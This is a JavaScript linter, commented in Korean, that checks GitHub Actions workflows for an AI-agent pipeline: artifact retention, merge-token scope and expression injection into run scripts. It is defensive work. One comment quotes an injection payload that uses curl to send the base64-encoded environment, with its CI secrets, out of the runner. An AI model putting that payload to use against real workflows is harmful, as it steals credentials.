/**
 * 아티팩트 보관 상한(ADR-020 최종 리뷰 SF-1). 템플릿은 7일을 쓰고, 규칙은 14일까지 받는다 —
 * 사후 조사에 필요한 창(사람이 다음 근무일에 들여다보는 시간)은 남기되, 90일 기본값으로는
 * 되돌아갈 수 없게 한다.
 */
const RETENTION_MAX_DAYS = 14;

/**
 * ADR-021 — `FACTORY_MERGE_TOKEN`(머지 배우, admin PAT)이 나타나도 되는 **유일한** 파일.
 * 소유자의 요구를 한 줄로 옮기면: "에이전트가 `gh pr merge`를 어떤 모양으로 부르든, **그 토큰이
 * 없어서** 불가능해야 한다." 그 불변식은 파일 목록 하나로만 지켜진다 — 머지 토큰이 에이전트가 도는
 * 잡의 env에 한 번이라도 실리면, 그 잡 안의 모든 우회 경로가 다시 열린다.
 *
 * sweeper는 이 목록에 **없다**: sweeper가 건드리는 것은 `refs/heads/factory/lock-*`(보호되지 않은
 * 브랜치)·라벨·`workflow run`뿐이라 전부 write 권한이면 된다. 관리자 권한이 필요한 일을 sweeper에
 * 주는 순간 "머지 권한이 도는 자리"가 하나 늘어난다.
 */
const MERGE_TOKEN = "FACTORY_MERGE_TOKEN";
const MERGE_TOKEN_FILES = new Set(["factory-merge.yml"]);
const AGENT_TOKEN_RE = /\b(CLAUDE_CODE_OAUTH_TOKEN|ANTHROPIC_API_KEY)\b/;
/**
 * 예외는 스크럽 스텝 하나다(ADR-020 SF-1). 그 스텝은 자격증명을 **쓰려고**가 아니라 아티팩트에서
 * **리터럴로 지우려고** 모든 시크릿을 env로 받는다 — `claude`를 띄우지 않고, `run:`은
 * `scrub-artifacts.js` 한 줄이다. 이 예외가 없으면 "지우기 위해 받는 것"과 "쓰기 위해 받는 것"을
 * 규칙이 구분하지 못해, 머지 토큰만 스크럽 대상에서 빠지는(=아티팩트에 남는) 결과가 된다.
 *
 * **ADR-021 r1 finding 5 — 예외의 열쇠는 두 개다.** 예전에는 블록 어디에든 `scrub-artifacts.js`라는
 * 문자열이 있으면 통과였다: 스텝 이름도, 주석 한 줄도, `run:` 안의 `node …scrub-artifacts.js &&
 * claude -p …`도 전부 같은 값이었다. 이제는 (a) 스텝이 **`id: scrub-artifacts`를 선언**하고
 * (b) 그 블록의 **`run:` 줄 중 하나가 실제로 `scrub-artifacts.js`를 실행**해야 한다. `id:`는 YAML의
 * 스텝 식별자라 워크플로 안에서 유일해야 하고(자유 텍스트인 `name:`과 다르다), `run:`은 그 스텝이
 * 실제로 무엇을 하는지다 — 둘을 함께 요구하면 "예외를 쓰려면 스텝을 스크럽 스텝으로 **선언하고**
 * 정말로 스크럽을 실행해야 한다"가 된다.
 *
 * 그래도 이것은 **템플릿을 고칠 수 있는 사람**을 막지 못한다(둘 다 쓰고 뒤에 `claude`를 붙이면 된다).
 * 그 지점을 막는 것은 린트가 아니라 L1이다: `.github/**`가 `[protected].factory`에 있으므로
 * 워크플로를 건드리는 PR은 자동 머지되지 않고 사람이 diff를 읽고 머지한다(ADR-021 r1 MF-2 c).
 */
const SCRUB_STEP_ID_RE = /^\s*id:\s*(['"]?)scrub-artifacts\1\s*$/;
const SCRUB_STEP_RUN_RE = /scrub-artifacts\.js/;
const isScrubStep = (block) => block.some((l) => SCRUB_STEP_ID_RE.test(l)) && runLines(block).some((l) => SCRUB_STEP_RUN_RE.test(l));

/**
 * 스텝 블록에서 `run:` 스칼라의 본문 줄만 뽑는다 — 한 줄짜리 `run: …`은 그 줄 자체, 블록 스칼라
 * (`run: |`)는 더 깊이 들여쓴 줄들. `env:`·`name:`·주석은 포함되지 않는다.
 */
function runLines(block) {
  const out = [];
  for (let i = 0; i < block.length; i++) {
    const m = /^(\s*)(?:-\s+)?run:(.*)$/.exec(block[i]);
    if (!m) continue;
    const rest = m[2].trim();
    if (rest !== "" && !/^[|>][-+0-9]*$/.test(rest)) { out.push(rest); continue; }
    const indent = block[i].search(/\S/);
    for (let j = i + 1; j < block.length; j++) {
      if (block[j].trim() === "") continue;
      if (block[j].search(/\S/) <= indent) break;
      out.push(block[j]);
    }
  }
  return out;
}

/**
 * KTB-34 own-calendar 결함 — `checkWorkflows`가 `.github/workflows/*.yml` 전부를 도는 것(ADR-021 r1
 * MF-2 d, merge-token-scope가 팩토리 밖 파일도 봐야 하므로)은 **머지 토큰 규칙 하나**의 요구였는데,
 * 구현이 파일 범위를 나누지 않아 `artifact-retention`·`no-expression-in-run`·`runner-id-consistent`
 * 등 "팩토리 스테이지는 이런 모양이어야 한다"는 규칙까지 입양자의 자기 워크플로(`build.yml` 같은
 * 앱 빌드)에 적용됐다. own-calendar(2026-09-14)의 `build.yml`은 아티팩트를 올리지만 팩토리가 설치한
 * 파일이 아니다 — 팩토리가 그 파일의 `retention-days`를 요구할 근거가 없다.
 *
 * 그래서 규칙을 두 스코프로 가른다: `scope: "factory"`(파일이 팩토리 템플릿이라고 **가정하는** 모든
 * 규칙 — 아래 첫 두 블록, `no-expression-in-run`, `lintStageWorkflow`의 sweep-list 규칙 전부)는
 * **팩토리 소유 워크플로 파일**(`factory-*.yml` — `factory init`이 설치하는 이름들과 같은 접두사;
 * 이 저장소 자신의 `publish.yml`은 팩토리 소유가 아니다)에서만 판정한다. `merge-token-scope`
 * (ADR-021)만 `scope: "repo"`로 남아 모든 파일에서 판정한다 — 머지 배우의 토큰이 **어느** 워크플로의
 * 에이전트 스텝에도 있으면 안 된다는 불변식은 파일이 팩토리 소유인지와 무관하기 때문이다.
 *
 * 소유 여부는 호출자(doctor의 `checkWorkflows`)가 판정해 `factoryOwned`로 넘긴다 — 이름 규칙(어떤
 * 접두사가 팩토리 것인가)은 그쪽의 지식이지 린터의 지식이 아니다. 인자를 생략하면(테스트의 이름 없는
 * 스니펫들처럼) 기본값 `true`로 예전 동작을 그대로 유지한다.
 */
export function isFactoryWorkflowFile(file) {
  return typeof file === "string" && /^factory-[\w-]+\.ya?ml$/.test(file);
}

/** ADR-009 규칙을 텍스트 수준에서 검사한다. YAML 파서 없이 — 의존성 추가 금지. */
export function lintWorkflow(text, { file = null, factoryOwned = true } = {}) {
  const out = [];
  const lines = text.split("\n");
  if (factoryOwned) {
    lines.forEach((l, i) => {
      // 1) flow mapping 안의 ${{ }}: 같은 줄에서 여는 '{' (단, '${{'의 일부가 아님) 뒤에 '${{'가 온다
      const stripped = l.replace(/'[^']*'/g, "''").replace(/"[^"]*"/g, '""');
      if (/(^|[^$])\{[^}\n]*\$\{\{/.test(stripped)) out.push({ line: i + 1, rule: "flow-interpolation", msg: "${{ }} inside a flow mapping breaks the workflow file — use a block mapping" });
      // 1b) `ready_for_review`는 어떤 factory 워크플로의 트리거에도 있으면 안 된다(KTB-15b I1) —
      // merge-stage가 머지 직전 draft PR을 ready로 뒤집으면(`gh pr ready`, KTB-15) 그 자체가
      // `ready_for_review` 이벤트를 만든다. 그 이벤트를 듣는 워크플로(예: factory-integrity)가 diff는
      // 그대로인데 새 필수 체크 런을 또 시작하고, 그 런이 끝나기 전에 `gh pr merge`가 먼저 불려
      // required-checks 판정이 흔들릴 수 있다(레이스). 주석에서의 언급은 괜찮다 — 실제 트리거 목록에
      // 있는 토큰만 본다.
      if (/\bready_for_review\b/.test(l.replace(/#.*/, ""))) {
        out.push({ line: i + 1, rule: "ready-for-review-trigger", msg: "pull_request types must not include ready_for_review — the merge stage's own draft→ready flip (KTB-15) would retrigger this workflow and race `gh pr merge`" });
      }
    });
    // 2) upload-artifact 스텝: 스텝 블록(다음 '- '까지) 안에 dot-경로가 있으면 include-hidden-files: true 필수
    for (let i = 0; i < lines.length; i++) {
      if (!/uses:\s*actions\/upload-artifact@/.test(lines[i])) continue;
      const indent = lines[i].search(/\S/);
      let j = i + 1; const block = [];
      while (j < lines.length && (lines[j].trim() === "" || lines[j].search(/\S/) > indent || (lines[j].search(/\S/) === indent && !lines[j].trim().startsWith("- ")))) {
        if (lines[j].search(/\S/) === indent && lines[j].trim().startsWith("- ")) break;
        block.push(lines[j]); j++;
      }
      const hidden = block.some((b) => /(^|\s|\|)\.[\w-]+\//.test(b.replace(/#.*/, "")) && !/include-hidden-files/.test(b));
      const has = block.some((b) => /include-hidden-files:\s*true/.test(b));
      if (hidden && !has) out.push({ line: i + 1, rule: "hidden-artifact", msg: "upload-artifact with a dot-directory path needs include-hidden-files: true" });
      // 2b) ADR-020 최종 리뷰 SF-1 — **보관 기간은 명시적이어야 하고 짧아야 한다.** 이 업로드에는
      // `claude -p` 트랜스크립트와 `.factory/out/`이 통째로 들어가고, 그 트리에는 `actions/checkout`이
      // 심은 `.git/config`의 basic-auth 헤더가 함께 있다(`persist-credentials`는 락 push 때문에 끌 수
      // 없다 — ADR-020의 알려진 한계). 공개 저장소에서 아티팩트는 **레포 read 권한자 누구나** 받는다.
      // `retention-days`가 없으면 기본은 **90일**이고, 그 숫자는 파일 어디에도 쓰여 있지 않아 아무도
      // 그것을 결정으로 읽지 않는다. 업로드 직전의 스크럽(`scrub-artifacts.js`)이 1차 방어라면 이 값은
      // 2차다: 스크럽이 놓친 모양이 있어도 노출 창이 7일로 닫힌다. 값을 **읽을 수 없으면**(표현식)
      // 통과시키지 않는다 — `${{ vars.X }}`가 비어 있으면 조용히 90일로 돌아간다.
      //
      // 이 규칙은 **팩토리 소유 워크플로에만** 건다(KTB-34): 팩토리 템플릿의 크리덴셜 노출을 막는
      // 규칙이지, 입양자가 올리는 자기 앱 빌드 아티팩트의 보관 정책을 팩토리가 정할 근거는 없다.
      const retentionLine = block.map((b) => /^\s*retention-days:\s*(.+?)\s*$/.exec(b.replace(/^([^#]*?)\s+#.*$/, "$1"))).find(Boolean);
      const days = retentionLine ? Number(retentionLine[1]) : null;
      if (days == null || !Number.isInteger(days) || days < 1 || days > RETENTION_MAX_DAYS) {
        out.push({ line: i + 1, rule: "artifact-retention", msg: `every actions/upload-artifact step needs an explicit \`retention-days:\` of 1–${RETENTION_MAX_DAYS} (the factory templates use 7) — the default is 90 days, and these artifacts carry the session transcript and the checkout tree whose \`.git/config\` holds the bot token's basic-auth header, downloadable by anyone with repo read (ADR-020 final review SF-1)` });
      }
      // 3) `~`는 **셸 확장**이지 glob이 아니다. upload-artifact는 경로를 셸에 넘기지 않고 그대로 glob으로
      // 쓰므로 `~/.claude/projects/**/*.jsonl`은 아무것도 맞히지 못한다 — `if-no-files-found: ignore`까지
      // 붙어 있으면 **실패조차 하지 않고** 빈 아티팩트가 올라간다(KTB-7 재리뷰: 트랜스크립트가 산출물
      // 추출의 1순위 출처인데 몇 회차째 비어 있었다). $HOME은 선행 스텝에서 GITHUB_ENV로 넘긴다.
      block.forEach((b, k) => {
        // 인용부호는 벗기고 본다 — `path: "~/x"`도 같은 버그다(YAML이 따옴표를 떼고 나면 남는 건 `~/x`이고,
        // upload-artifact는 그것을 셸이 아니라 glob으로 쓴다). 따옴표 하나로 규칙을 비켜 갈 수 있으면 규칙이 아니다.
        const bare = unquotePathValue(b.replace(/#.*/, ""));
        if (/^\s*(?:-\s*)?(?:path:\s*)?~\//.test(bare)) {
          out.push({ line: i + 2 + k, rule: "tilde-path", msg: "upload-artifact does not expand `~` — export $HOME via $GITHUB_ENV and use ${{ env.… }}" });
        }
        // 4) `${{ env.X }}`로 시작하는 경로에 `||` 폴백이 없으면, 그 env를 세우는 스텝이 실패했을 때
        // 경로가 `/**/*.jsonl`로 — 곧 **루트 앵커 glob**으로 — 접힌다. 업로드 스텝은 `if: always()`라
        // 그때도 돌고, `if-no-files-found: ignore`라 조용하다: 러너 파일시스템 전체를 훑는 일이
        // 아무 경고 없이 일어난다(KTB-10 I1). 폴백은 반드시 워크스페이스 안을 가리켜야 한다.
        if (/^\s*(?:-\s*)?(?:path:\s*)?\$\{\{\s*env\./.test(bare) && !/\|\|/.test(bare)) {
          out.push({ line: i + 2 + k, rule: "env-path-no-fallback", msg: "an artifact path starting with ${{ env.… }} needs a `||` fallback — an unset env collapses it to a root-anchored glob" });
        }
      });
    }
    out.push(...lintExpressionsInRun(lines));
  }
  out.push(...lintMergeTokenScope(lines, file));
  if (factoryOwned) {
    const stage = STAGE_RUN.exec(text);
    if (stage) out.push(...lintStageWorkflow(text, lines, stage[1]));
  }
  return out;
}

/**
 * ADR-020 최종 리뷰 MF-2 — **공격자가 고를 수 있는 텍스트는 `run:` 안에 들어가지 않는다.**
 *
 * `${{ … }}`는 셸이 보기 **전에** Actions가 텍스트로 치환한다. 그래서 `run: node x.js ${{ inputs.issue }}`는
 * 인자 전달이 아니라 **코드 합성**이다: `inputs.issue`는 자유 문자열(`type: string`)이고, `gh workflow run`을
 * 부를 수 있는 사람(= 레포 write, 또는 유출된 CI 토큰, 또는 봇 토큰 자신)이 `1; curl -sd "$(env|base64 -w0)" …`을
 * 넣으면 그 스텝의 env에 실린 CLAUDE_CODE_OAUTH_TOKEN·ANTHROPIC_API_KEY·FACTORY_BOT_TOKEN이 그대로 나간다.
 * GitHub이 일부러 갈라 둔 경계(write ≠ secret read)가 한 줄로 무너진다. KTB-8이 workflow_dispatch를
 * **재점화의 주 손잡이**로 만든 뒤라 이 싱크는 예외 경로가 아니라 본선 위에 있었다.
 *
 * 고침은 기계적이다(스텝 `env:`로 묶고 `"$VAR"`로 읽는다) — 그래서 규칙으로 고정한다. 사람이 나중에
 * 한 줄을 "간단하게" 되돌리는 것이 바로 이 결함이 생긴 방식이다.
 *
 * 보는 범위는 `${{ inputs.` 와 `${{ github.event.` 둘뿐이다. `github.sha`·`job.status`·`github.run_id`·
 * `secrets.*`는 공격자가 고를 수 없는 값이라(GitHub이 만든다) 같은 종류의 위험이 아니다 —
 * 규칙을 넓히면 정당한 자리까지 잡아 규칙 자체가 꺼진다.
 *
 * `run:` 블록 안의 `#` 줄도 **벗기지 않는다**: 셸 주석이어도 Actions의 치환은 그보다 먼저 일어나므로
 * 주석 안의 `${{ … }}`도 똑같이 확장된다(다만 셸이 실행하지 않을 뿐이다 — 그리고 그 텍스트가 줄바꿈을
 * 품으면 다음 줄은 실행된다).
 */
const RUN_EXPRESSION = /\$\{\{\s*(inputs\.|github\.event\.)/;
function lintExpressionsInRun(lines) {
  const out = [];
  const flag = (i, text) => {
    if (RUN_EXPRESSION.test(text)) out.push({ line: i + 1, rule: "no-expression-in-run", msg: "never interpolate ${{ inputs.* }} or ${{ github.event.* }} into a `run:` script — bind it in the step's `env:` (ISSUE: ${{ … }}) and read \"$ISSUE\", validated as ^[0-9]+$. The expression is substituted as text before the shell parses the line, so a free-form input becomes code in a step that holds every secret (ADR-020 final review MF-2)" });
  };
  for (let i = 0; i < lines.length; i++) {
    const m = /^(\s*)(?:-\s+)?run:(.*)$/.exec(lines[i]);
    if (!m) continue;
    const rest = m[2].trim();
    // 한 줄짜리 `run: …`은 그 줄이 곧 스크립트다. `run: |`·`run: >`(및 `|-`/`>-` 등)와 값이 빈 형태는
    // 블록 스칼라 — 더 깊이 들여쓴 줄들이 본문이다.
    if (rest !== "" && !/^[|>][-+0-9]*$/.test(rest)) { flag(i, rest); continue; }
    const indent = lines[i].search(/\S/);
    for (let j = i + 1; j < lines.length; j++) {
      if (lines[j].trim() === "") continue;
      if (lines[j].search(/\S/) <= indent) break;
      flag(j, lines[j]);
    }
  }
  return out;
}

/**
 * ADR-021 `merge-token-scope` — 머지 배우의 토큰은 **머지 워크플로 밖으로 나가지 않는다.**
 *
 * KTB-34: `lintWorkflow`가 받는 `factoryOwned`와 무관하게 **항상** 판정한다(위 `scope: "repo"`) —
 * 이 규칙이 보는 것은 "이 파일이 팩토리 템플릿의 모양을 지켰는가"가 아니라 "머지 토큰이 어딘가의
 * 에이전트 스텝에 새고 있는가"이고, 그 물음은 파일이 팩토리 소유든 입양자의 자기 워크플로든 같다.
 *
 * 두 갈래로 본다:
 * 1. **파일 범위** — `file`을 받은 호출(doctor의 `checkWorkflows`)에서만 판정한다. `lintWorkflow`는
 *    원래 이름 없는 스니펫도 받으므로(테스트·부분 조각), 파일명이 없으면 이 갈래는 침묵한다.
 * 2. **스텝 범위** — 파일명과 무관하게 언제나 판정한다. 머지 토큰과 에이전트 토큰
 *    (`CLAUDE_CODE_OAUTH_TOKEN`/`ANTHROPIC_API_KEY`)이 **같은 스텝의 env**에 함께 있으면, 그것은
 *    `claude -p`가 도는 자리에 머지 권한이 들어왔다는 뜻이다 — 정확히 이 ADR이 닫은 문이다.
 *    스크럽 스텝만 예외다(위 주석).
 *
 * 주석은 벗기고 본다 — 이 규칙을 **설명하는** 주석(그리고 ADR 인용)이 바로 그 파일들 안에 있고,
 * 그것까지 세면 규칙이 자기 설명문을 읽고 발화한다.
 */
function lintMergeTokenScope(lines, file) {
  const out = [];
  const bare = lines.map((l) => l.replace(/#.*/, ""));
  const hits = bare.map((l, i) => (l.includes(MERGE_TOKEN) ? i : -1)).filter((i) => i !== -1);
  if (!hits.length) return out;

  if (file && !MERGE_TOKEN_FILES.has(file)) {
    out.push({ line: hits[0] + 1, rule: "merge-token-scope", msg: `${MERGE_TOKEN} may appear only in ${[...MERGE_TOKEN_FILES].join(", ")} — it is the merge actor's admin credential, and the whole point of ADR-021 is that no stage where an agent runs can reach it. Lock-branch deletes, label edits and \`factory/*\` pushes need plain write, so FACTORY_BOT_TOKEN is enough everywhere else` });
  }

  // 스텝 경계: `- name:`/`- uses:` 줄에서 다음 그런 줄 직전까지.
  const starts = bare.map((l, i) => (/^\s*-\s+(name|uses):/.test(l) ? i : -1)).filter((i) => i !== -1);
  const stepRange = (i) => {
    const s = starts.filter((x) => x <= i).pop();
    if (s === undefined) return null;                       // 스텝보다 앞(잡 레벨 env 등) — 아래에서 파일 전체로 본다
    const nextIdx = starts.find((x) => x > s);
    return [s, nextIdx === undefined ? bare.length : nextIdx];
  };
  const flagged = new Set();
  for (const i of hits) {
    const range = stepRange(i);
    const [from, to] = range ?? [0, bare.length];
    if (flagged.has(from)) continue;
    const block = bare.slice(from, to);
    if (isScrubStep(block)) continue;  // 지우기 위해 받는 스텝은 예외 — `id:`와 `run:` 둘 다 맞을 때만
    if (!block.some((l) => AGENT_TOKEN_RE.test(l))) continue;
    flagged.add(from);
    out.push({ line: i + 1, rule: "merge-token-scope", msg: `${MERGE_TOKEN} is in the same step as CLAUDE_CODE_OAUTH_TOKEN/ANTHROPIC_API_KEY — that is a step where \`claude -p\` runs, and ADR-021 exists so that merge power is unreachable from there by permission, not by command pattern. The only exception is the credential-scrub step, which holds every secret as a literal to redact and never starts an agent` });
  }
  return out;
}

/**
 * ADR-020 KTB-24/KTB-26 — 스테이지 워크플로에만 거는 세 규칙. "이 텍스트가 스테이지 워크플로다"의
 * 표식은 `run-stage.js <stage> "$ISSUE"`를 **정리 플래그 없이** 실행하는 줄 하나다: 그래야 설정 조각·
 * composite action·정리 스텝만 있는 스니펫이 규칙에 걸리지 않는다(`lintWorkflow`는 파일 이름을 받지 않는다).
 *
 * 최종 리뷰 MF-2 이후 이슈 번호는 스텝 `env:`의 `ISSUE`로만 들어온다 — 그래서 이 표식이 곧 "MF-2의
 * 모양을 지켰는가"이기도 하다. 옛 모양(`… ${{ github.event.issue.number || inputs.issue }}`)으로
 * 되돌리면 이 정규식이 빗나가 **스테이지 규칙 네 개가 통째로 조용해진다** — 그 침묵이 곧 회귀 신호다
 * (`no-expression-in-run`이 같은 줄을 따로 잡으므로 파일이 조용히 통과하지는 않는다).
 */
const STAGE_RUN = /node \.factory\/bin\/run-stage\.js\s+(triage|plan|implement|review|merge)\s+"\$ISSUE"(?![^\n]*--aborted)/;

/**
 * KTB-24 — review·implement의 `timeout-minutes` 하한. 데모 #15의 review는 4역할 × +709줄 PR을
 * 45분 안에 못 끝내고 **한도에 걸려** 잘렸다(45 m 19 s, 취소로 기록돼 사람의 `gh run cancel`과
 * 로그상 구분되지 않았다). 이 둘은 에이전트가 실제로 코드를 읽고 쓰는 유일한 스테이지라, 상한이
 * 짧으면 "작업이 실패했다"가 아니라 **"작업이 끝나기 전에 잘렸다"**가 반복된다 — 그 런의 비용은
 * 전액 매몰되고 재실행은 같은 크기의 일을 같은 한도로 다시 한다. 값은 상수다(하네스 설정이 아니다):
 * 워크플로 파일은 `factory init`이 **그대로** 설치하는 템플릿이라 설치 시점의 치환 지점이 없고,
 * 치환을 도입하면 `--upgrade`가 프로젝트가 손으로 올린 값을 매번 되돌린다.
 */
const TIMEOUT_FLOOR = { review: 60, implement: 60 };

/**
 * 정리 스텝의 `if:` (ADR-020 KTB-24 fix). 공백은 넉넉히 받되 세 토큰(`always()`, `job.status`,
 * `success`)은 모두 있어야 한다 — 따옴표는 `'`·`"` 둘 다 허용한다(YAML에서 둘 다 유효하다).
 * **줄 앞에 `#`가 없어야 한다**: 이 규칙이 요구하는 문자열을 설명하는 주석이 바로 그 위에 있고,
 * 주석까지 세면 실제 `if:`를 예전 모양으로 되돌려도 린트가 통과한다(규칙이 자기 설명문을 읽는다).
 */
const ABORTED_IF = /^[^#\n]*\bif:\s*always\(\)\s*&&\s*job\.status\s*!=\s*['"]success['"]/m;

function lintStageWorkflow(text, lines, stage) {
  const out = [];
  const floor = TIMEOUT_FLOOR[stage];
  if (floor != null) {
    const i = lines.findIndex((l) => /^\s*timeout-minutes:\s*\d+\s*$/.test(l));
    const minutes = i === -1 ? null : Number(/(\d+)/.exec(lines[i])[1]);
    if (minutes == null || minutes < floor) {
      out.push({ line: i + 1 || 1, rule: "stage-timeout-floor", msg: `the ${stage} stage needs timeout-minutes ≥ ${floor} — a shorter cap cancels the job mid-work and the whole run's cost is sunk (KTB-24)` });
    }
  }
  // 스텝 목록에는 `- name:`뿐 아니라 **이름 없는 `- uses:` 스텝**도 센다(KTB-24 fix). `sweep-step-last`는
  // "Sweep이 마지막 스텝인가"를 묻는데, 이름 없는 스텝을 못 보면 `Sweep` 뒤에 붙은 `- uses: …` 한 줄이
  // 규칙을 소리 없이 빠져나간다 — 그 스텝이 실패하면 방금 sweep이 훑은 상태가 다시 흔들린다.
  const steps = [];
  lines.forEach((l, i) => {
    const m = /^\s*-\s+(name|uses):\s*(.+?)\s*$/.exec(l);
    if (m) steps.push({ name: m[1] === "name" ? m[2] : `uses:${m[2]}`, line: i + 1 });
  });
  const aborted = steps.findIndex((s) => s.name === "Aborted cleanup");
  const sweep = steps.findIndex((s) => s.name === "Sweep");
  // (1) 취소·실패 정리 스텝이 있고, 그 스텝이 실제로 `--aborted`를 이 스테이지 이름으로 부른다.
  // 조건은 `always() && job.status != 'success'`여야 한다(KTB-24 fix): `cancelled() || failure()`는
  // "런이 취소됐다"와 "앞 스텝이 실패했다"만 덮어서, 잡 타임아웃·러너 소실처럼 그 어느 쪽으로도
  // 분류되지 않는 끝맺음에서 정리가 통째로 건너뛰어진다.
  if (aborted === -1 || !new RegExp(`run-stage\\.js ${stage} [^\\n]*--aborted`).test(text) || !ABORTED_IF.test(text)) {
    out.push({ line: aborted === -1 ? 1 : steps[aborted].line, rule: "aborted-cleanup-step", msg: `a stage workflow needs an "Aborted cleanup" step with \`if: always() && job.status != 'success'\` running \`run-stage.js ${stage} <issue> --aborted\` — a job that ends any way but success never reaches run-stage's finally, so the lock is orphaned and nothing is recorded (KTB-24)` });
  }
  // (2) 마지막 스텝은 `Sweep`이고 `--quick`으로 돈다 — 정리보다 **뒤**여야 방금 세운 blocked까지 훑는다.
  if (sweep === -1 || sweep !== steps.length - 1 || !/node \.factory\/bin\/sweep\.js --quick/.test(text) || !/- name: Sweep\n\s+if: always\(\)/.test(text)) {
    out.push({ line: sweep === -1 ? lines.length : steps[sweep].line, rule: "sweep-step-last", msg: "a stage workflow must end with a `Sweep` step (`if: always()`, `sweep.js --quick`) — the cron sweeper alone is not reliable enough (KTB-26)" });
  } else if (aborted !== -1 && aborted > sweep) {
    out.push({ line: steps[sweep].line, rule: "sweep-step-last", msg: "the Sweep step must come after the Aborted cleanup step — sweeping before the cleanup cannot see the blocked label it is meant to pick up (KTB-26)" });
  }
  // (3) `Run stage`와 `Aborted cleanup`은 **같은** FACTORY_RUNNER_ID 식을 실어야 한다(r1 재리뷰 M5).
  // KTB-24 fix 이후 정리 스텝은 락 커밋 제목의 `runner=`와 자기 `FACTORY_RUNNER_ID`를 비교해 "내 락인가"를
  // 가른다. 둘이 갈리면 정리가 자기 런의 락을 남의 것으로 읽고 그대로 두고 나간다 — 고아 락이 남고,
  // 그 뒤의 모든 dispatch가 claim에서 죽는다(데모 #15). 값이 무엇인지는 묻지 않는다(러너마다 다를 수
  // 있다) — **같은가**만 묻는다.
  const runStage = steps.findIndex((s) => s.name === "Run stage");
  const runnerIdOf = (i) => {
    if (i === -1) return null;
    const end = i + 1 < steps.length ? steps[i + 1].line - 1 : lines.length;
    for (let k = steps[i].line - 1; k < end; k++) {
      // YAML의 줄 끝 주석은 **공백 뒤의** `#`다 — 값 안의 `#`(`gha-#1`)를 주석으로 읽어 자르지 않는다.
      const m = /^\s*FACTORY_RUNNER_ID:\s*(.+?)\s*$/.exec(lines[k].replace(/\s+#.*$/, ""));
      if (m) return m[1];
    }
    return null;
  };
  const runId = runnerIdOf(runStage);
  const abortId = runnerIdOf(aborted);
  // r1 nit 11: 세 가지 실패를 **세 문장**으로 가른다. 예전에는 스텝 이름이 `Run stage`가 아닐 때도
  // "FACTORY_RUNNER_ID가 어긋났다"고 말해서, 읽는 사람을 없는 문제로 보냈다.
  const missingStep = [runStage === -1 ? '"Run stage"' : null, aborted === -1 ? '"Aborted cleanup"' : null].filter(Boolean);
  const noValue = [runId == null && runStage !== -1 ? '"Run stage"' : null, abortId == null && aborted !== -1 ? '"Aborted cleanup"' : null].filter(Boolean);
  const at = aborted === -1 ? 1 : steps[aborted].line;
  if (missingStep.length) {
    out.push({ line: at, rule: "runner-id-consistent", msg: `a stage workflow needs both a "Run stage" and an "Aborted cleanup" step, named exactly that — missing: ${missingStep.join(", ")}. The cleanup tells its own lock from someone else's by comparing FACTORY_RUNNER_ID with the lock's \`runner=\` field, and this rule reads that value per step (KTB-24 fix / KTB-28)` });
  } else if (noValue.length) {
    out.push({ line: at, rule: "runner-id-consistent", msg: `FACTORY_RUNNER_ID is not set in the step's own \`env:\` block on: ${noValue.join(", ")} — a job-level \`env:\` is not read by this rule, so set it on both steps. Without it the cleanup cannot prove the lock is its own and leaves it alone, and the orphan lock stalls every later dispatch (KTB-24 fix / KTB-28)` });
  } else if (runId !== abortId) {
    out.push({ line: at, rule: "runner-id-consistent", msg: `the "Run stage" and "Aborted cleanup" steps set DIFFERENT FACTORY_RUNNER_ID expressions (${runId} vs ${abortId}) — the cleanup compares it against the lock's \`runner=\` field, so a drifted value makes every run read its own lock as a stranger's (KTB-24 fix / KTB-28)` });
  }
  return out;
}

/**
 * `path: "~/x"` / `- '${{ env.X }}/**'` 처럼 값만 따옴표로 감싼 줄에서 따옴표를 벗긴다.
 * 들여쓰기와 `- `·`path:` 접두는 그대로 둔다 — 위 정규식들이 그것으로 줄 모양을 가른다.
 */
function unquotePathValue(line) {
  return line.replace(/^(\s*(?:-\s*)?(?:path:\s*)?)(['"])(.*)\2\s*$/, "$1$3");
}

export function lintLoggingHook(text) {
  const last = text.split("\n").map((l) => l.trim()).filter(Boolean).at(-1);
  return last === "exit 0" ? [] : [{ line: text.split("\n").length, rule: "exit0", msg: "logging hooks must end with `exit 0`" }];
}
